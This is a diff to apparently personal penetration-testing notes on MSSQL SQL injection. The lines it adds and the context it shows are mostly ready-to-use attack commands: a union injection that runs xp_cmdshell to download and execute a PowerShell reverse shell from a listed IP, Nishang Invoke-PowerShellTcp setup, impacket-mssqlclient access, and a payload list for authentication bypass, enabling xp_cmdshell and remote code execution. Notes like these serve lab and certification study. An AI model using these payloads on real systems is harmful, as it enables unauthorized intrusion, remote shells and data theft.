@@ -86,6 +86,24 @@ Revshell Command that worked:
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 ```
 
+#### Reverse
+
+Edit Invoke-PowerShellTcp.ps1:  
+
+```bash
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+```
+
+```bash
+impacket-mssqlclient <user>@<ip> -db <database>
+```
+
+```bash
+xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
+```
+
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
 #### Possible Queries
 
 Test for xp_cmdshell first. A great guide is pentestmonkey's mssql cheatsheet.
@@ -129,6 +147,13 @@ q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from
 
 ```bash
 select * from movies where CONTAINS (name, '*500*');
+```
+
+```bash
+' or 1=1-- # Authentication Bypass
+' SELECT @@version; WAITFOR DELAY '00:00:10'; — # Get Version + Delay
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- # Enable xp_cmdshell
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;-- # RCE
 ```
 
 #### Enumeration
